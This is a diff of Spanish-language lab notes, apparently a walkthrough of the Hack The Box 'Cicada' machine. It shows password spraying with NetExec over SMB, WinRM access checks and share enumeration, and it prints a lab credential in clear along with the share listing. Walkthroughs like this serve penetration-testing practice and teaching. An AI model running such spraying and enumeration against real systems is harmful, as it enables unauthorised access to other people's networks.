@@ -141,7 +141,7 @@ Vemos que no son susceptibles
 Con la contraseña que hemos obtenido del `.txt` en [[#SMB (139, 445)]] y los usuarios con [[#Enumeración de usuarios validos]]
 `nxc smb 10.129.231.149 -u users.txt -p passwords`
 
-Obtemos las siguientes credenciales
+Optemos las siguientes credenciales
 ```ad-hint
 michael.wrightson::Cicada$M6Corpb*@Lp#nZp!8
 ```
@@ -149,10 +149,32 @@ michael.wrightson::Cicada$M6Corpb*@Lp#nZp!8
 Verificamos que el usuario es valido
 `nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`
 
-Verificamos tambien si pertenece al grupo de remote users management
+Verificamos también si pertenece al grupo de remote users management
 `nxc winrm 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'`
 
-En caso de que pertenezca a este apareceria el `pwned`
+En caso de que pertenezca a este aparecería el `pwned`
+
+También podemos verificar si esa contraseña le pertenece a algún usuario mas
+`nxc smb 10.129.231.149 -u users.txt -p passwords --continue-on-success`
+
+Y no hay ningún usuario mas
+
+## Listar recursos compartidos con credenciales validas
+
+Para listar estos recursos compartidos con un usuario valido usaremos
+`nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares`
+
+```txt
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+DEV                             
+HR              READ            
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share 
+SYSVOL          READ            Logon server share 
+```
 
 
 
